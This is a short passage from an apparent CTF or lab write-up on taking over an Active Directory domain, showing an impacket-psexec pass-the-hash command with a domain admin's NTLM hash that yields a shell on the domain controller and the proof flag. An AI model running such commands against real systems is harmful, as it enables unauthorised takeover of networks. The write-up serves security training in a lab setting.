We are not going to do any enumeration, lateral movement or Privilege escalation because we already have domain admin's ntlm hash.

**So straight away we can get a fully interactive shell using Impacket-psexec:**

```
impacket-psexec -hashes 00000000000000000000000000000000:4979d69d4ca66955c075c41cf45f24dc tom_admin@10.10.151.140
```

![[Pasted image 20240602175606.png]]

Finally got it..! We are domain controller now.

**Lets get the Proof.txt from Admin's Desktop:**
![[Pasted image 20240602175722.png]]
We got the Proof flag in Administrator's Desktop.


That's It for the AD...!

